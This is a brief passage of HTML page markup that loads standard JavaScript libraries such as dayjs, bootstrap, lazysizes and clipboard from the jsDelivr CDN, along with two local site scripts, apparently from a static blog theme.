src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
